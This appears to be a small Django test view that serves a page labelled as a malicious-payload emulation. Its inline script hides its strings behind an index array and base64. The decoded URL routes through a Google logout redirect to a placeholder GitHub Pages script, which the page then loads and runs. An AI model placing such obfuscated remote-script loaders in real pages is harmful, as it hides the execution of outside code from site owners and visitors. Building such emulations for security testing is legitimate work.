from django.http import HttpResponse

def test_payload(request):
    return HttpResponse("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Payload Demo</title>
    </head>
    <body>
        <h1>Testing Malicious Payload Emulation</h1>
        <script>
        (function(){
            const _0x1f3e=['atob','createElement','script','appendChild','body'];
            const encoded = "aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL0xvZ291dD9jb250aW51ZT1odHRwczovL3lvdXItdXNlcm5hbWUuZ2l0aHViLmlvL3NhZmUtcGF5bG9hZC5qcw==";
            const url = window[_0x1f3e[0]](encoded);
            const sc = document[_0x1f3e[1]](_0x1f3e[2]);
            sc.src = url;
            document[_0x1f3e[4]][_0x1f3e[3]](sc);
        })();
        </script>
    </body>
    </html>
    """, content_type="text/html")